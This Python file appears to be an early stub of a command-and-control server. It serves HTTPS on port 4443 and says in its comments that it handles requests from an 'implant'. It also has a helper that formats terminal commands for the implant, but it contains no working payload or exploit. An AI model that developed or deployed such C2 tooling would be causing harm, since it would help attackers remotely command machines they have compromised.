#!/usr/bin/python3

from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl
import time
from io import BytesIO
from cnc_routes.main import routes
# will eventually narrow down needed modules

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    """Using https://blog.anvileight.com/posts/simple-python-http-server/ as a starting point to handle requests from implant
    and https://medium.com/@andrewklatzke/creating-a-python3-webserver-from-the-ground-up-4ff8933ecb96"""
    
    def do_HEAD(self):
        return

    def do_GET(self):
        self.respond()


    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        self.send_response(200)
        self.end_headers()
        response = BytesIO()
        response.write(b'This is a POST request')
        response.write(b'Received: ')
        response.write(body)
        self.wfile.write(response.getvalue())

    def handle_http(self, status, content_type):
        self.send_response(status)
        self.send_header('Content-type', content_type)
        self.end_headers()
        return bytes("Hello, lol", "UTF-8")

    def respond(self):
        content = self.handle_http(200, 'text/html')
        self.wfile.write(content)

def prepare_command(command):
    """takes a terminal command and prepares it for consumption by implant
    makes an assumption that all terminal command arguments are delineated by '-' or '--'"""
    pre_prepared = command.split(" -") # lol now it's a list
    for x in range(1,len(pre_prepared)):
        temp = pre_prepared[x]
        pre_prepared[x] = "-" + temp

    return pre_prepared # it will be prepared after this point lol

def main():
    
    server_address = ("0.0.0.0", 4443)
    serv = HTTPServer(server_address, SimpleHTTPRequestHandler)
    serv.socket = ssl.wrap_socket(serv.socket,
        keyfile="key.pem",
        certfile="cert.pem", server_side=True)

    print(f"[+] {time.asctime()} -- Server UP on {server_address[0]}:{server_address[1]}")
    try:
        serv.serve_forever()
    except KeyboardInterrupt: # When we manually kill the server,
        pass                  # do so
    serv.server_close()       # gracefully
    print(f"[+] {time.asctime()} -- Server DOWN on {server_address[0]}:{server_address[1]}")



    

if __name__ == "__main__":
    main()